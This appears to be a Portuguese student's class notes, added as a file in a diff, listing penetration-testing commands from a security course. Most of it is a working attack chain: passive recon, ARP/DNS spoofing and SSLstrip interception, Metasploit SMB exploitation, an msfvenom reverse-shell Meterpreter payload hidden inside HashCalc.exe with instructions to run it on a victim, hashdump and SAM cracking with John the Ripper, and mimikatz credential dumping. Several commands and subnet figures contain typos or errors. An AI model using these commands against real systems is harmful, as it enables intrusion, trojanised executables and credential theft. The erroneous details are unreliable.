@@ -1,0 +1,343 @@
+IT SECURITY SPECIALIST
+
+Comandos utilizados na aula
+
+# Footprint
+
+maltego
+
+#captura de dados de dominio
+#captura de emais lincados no email
+#siga a sintax para mais flags
+
+theharvester -d (dominio) -l 200 -b all
+
+#site exploit database
+#Gogle doc database
+
+"nome do odjeto tipo email, ou Curriculo"filetype:docx site:(nome do site tipo .edu.br)
+
+
+# Usando o site
+
+#www.defaultpassword.com
+
+_________________________________________________________________________________________
+
+# Escaneamento
+
+# total de portas para tcp e udp portas 65535
+
+#classe de ips
+
+classe		ips privado		mascara		conotação usadas
+A 		10.0.0.0		255.0.0.0     		/8
+B 		172,16,0,0		255.255.0.0   		/16
+c 		192.168.0.0		255.255.255.0 		/24
+cidr		192.168..16.2					/22 especial 1022 hosts
+
+# total de hosts de uma rede 254
+
+# calculo 2elevado a quantidade de zeros - 2 + quantidade de hosts
+
+# Hosts
+# Pergunta
+
+Quantos hosts cabe em uma rede?
+
+4094 hosts
+
+Este dois ips se comunicam?
+
+não se comunicam id diferente
+
+192.168.15.1/20
+
+192.168.16.2/20
+
+_______________________________________________________________________________
+
+# Ping
+
+# wireshark
+ 
+# Escaneando rede com nmap PING SWEEP
+# Indentificando Hosts
+
+nmap -sP -v 192.168.0.1-254
+
+_______________________________________________________________________________
+
+# Existem 65535 Portas tcp e udp
+
+# Usando  
+# Para abrir porta etunel
+
+nc -l -p 666
+
+# Podendo tambem
+
+nc ip porta
+
+# Uzando zenmap para escanear
+
+comando: nmap -sS -p 666 -v 192.168.0.19
+
+# Mais detalhes em pdf anexo
+
+# Confifgurando o zenmap
+
+# Atualizar scripts nmap
+
+nmap --script-updatedb
+-________________________________________________________________________________
+
+# SPARTA
+
+# Para scaner e brotforce
+________________________________________________________________________________-
+
+
+# SNIFFING
+
+promiscuo tipo que captura o trafego de todo segmento de rede
+nao-promiscup somente de e para ele 
+
+tcpdump
+wireshark
+
+#captura de metodo post wireshark
+
+#filtro
+
+http.request.method==POST
+
+# Em HTML Form vai estar a senha
+
+_________________________________________________________________________________
+
+Social Engineering Toolkit
+
+Set
+
+clonando sites
+
+Ettercap 
+escaneando hosts
+mint 
+arp
+plugins
+dns_spoof
+
+# Configurando
+
+/etc/ettercap/etter.dns
+
+mint 
+ok
+___________________________________________________________________________________
+
+# Scaner de vulnerabilidades
+
+Nessus
+
+Quest
+
+Retina
+
+OpenVas
+
+Usando nma co script
+
+nmap -sU --script smb-vuln-ms08-067.nse -p U:137 192.168.1.105
+
+
+nmap -script smb-vuln-ms08-067.nse -p445 192.168.1.105
+
+___________________________________________________________________________________
+
+# ATAQUE MITM com CAIN e ABEL
+
+
+# Ettercap
+
+# wireshark
+
+filtropara logar em site sem criptografio 
+
+http.request.method=='POST'
+
+____________________________________________________________________________________
+
+# MITM com SSL
+
+SSLSTRIP
+
+# Configurando
+
+cat /proc/sys/ipv4/ip_forward
+
+vim edite este caminho se não tiver nada deiche com 1 so e salve
+
+cat para ver se esta com
+1
+
+route
+
+edite co iptables
+
+iptables -t nat -A PREROUTING -p tcp -destination-port 80 -j REDIRECT --to-port 666
+
+iptables -L -t nat --line-numbers
+
+sslstrip -- help
+
+
+sslstrip -a -l 666
+
+ja esta pronto para capturar
+
+abra o ettecap
+
+scaner os host
+
+
+# Descubra o sistema operacional com
+
+nmap -O 92.168.1.104
+
+mitm
+arp
+ok
+
+em cmd
+
+# cmd verificando
+arp -a 
+ipconfig
+
+______________________________________________________________________________________________________
+
+# Metasploit
+
+banner
+clear
+?
+search cve:2018
+
+search windows
+
+hosts
+db_nmap -sV O 192.168.1.106
+hosts vai estar la
+
+
+use exploit/windows/smb/ (aperte o tab e escolha)
+
+show
+
+verifique se esta tudo correto
+
+show options
+
+set RHOST 192.168.1.106
+
+show options
+
+set PAYLOAD windows/meterpreter/ (use tab para escolher)
+
+
+show options
+
+set LHOST 192.168.1.103
+
+show options
+
+# Execute
+
+esploit
+
+_______________________________________________________________________________________________________
+
+
+ARMITAGE
+
+o melhor
+
+_______________________________________________________________________________________________________
+
+msfvenom -h
+
+# para achar o -e use msfvenom -l encoders
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.103 LPORT=666 -e x86/shikata_ga_nai -b '\x00' -i 3 -x /scripts/HashCalc.exe -f exe /scripts/payload.exe
+
+criado o payload
+
+copie o exe payload e execute na maquina vitima
+
+antes de executar deiche a maquina escutando com
+
+metasploir
+
+use eploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.103
+set LPORT 666
+exploit
+?
+use o comando que quiser  ja com acesso
+use o hashdump para senha de adm
+copie  e import para o caim e abel 
+agora brut force com filtros do caim abel
+
+________________________________________________________________________________________________________________________
+
+
+# ATACK a SENHAS
+
+windows 10
+%windir%\system32\Config\SAM
+
+sando o cain e abel
+
+________________________________________________________________________________________________________________________
+
+
+# Use o site crackstation 
+
+_________________________________________________________________________________________________________________________
+
+# USE o ophcrack
+
+importe o arquivo sam
+e execute a força bruta
+lembrando que tem que adicionar rambomtable para fazer os atacks
+
+________________________________________________________________________________________________________________________
+locate rockyou
+
+________________________________________________________________________________________________________________________
+sendo o arquivo senha.txt com o hash do arquivo SAM
+
+john --format=NT senha.txt
+
+
+john --format=NT --wordlist=wordlist.txt senha.txt
+
+
+verificar se achou
+
+john senha.txt --show
+
+________________________________________________________________________________________________________________________
+
+
+MOVIMENTAÇÃO LATERAL
+
+mimikatz
+
+privilege::debug
+sekurlsa::logonpassword
+
+
